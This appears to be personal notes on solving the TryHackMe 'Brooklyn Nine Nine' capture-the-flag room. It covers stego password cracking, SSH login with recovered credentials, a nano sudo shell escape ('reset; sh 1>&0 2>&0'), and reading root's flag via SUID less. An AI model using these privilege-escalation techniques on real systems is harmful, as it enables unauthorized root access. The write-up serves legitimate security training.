#nano #less

https://tryhackme.com/r/room/brooklynninenine

---
#### Nmap
![[Screenshot_2024-05-26_20-25-24.png]]

There was a `note_to_jake.txt` on the ftp with the following note:
```text
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

The webpage contains a background image with a html comment saying "stenography"

So I used `stegseek` to crack the password and `steghide` to extract the `note.txt`:
```text
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

The ssh creds are `holt:fluffydog12@ninenine` and here I m in

The `sudo -l` gave me nano
```shell
CTRL+R
CTRL+X
cat /root/root.txt > /tmp/caca
```
That was my fast way to get the flag because I forgot how to do a shell

Here is the command for the shell:
```shell
reset; sh 1>&0 2>&0
```

The `less` binary has the SUID bit too, so ([Doc](https://yolospacehacker.com/hackersguide/toolbox.php?id=less))
```shell
less /root/root.txt
```



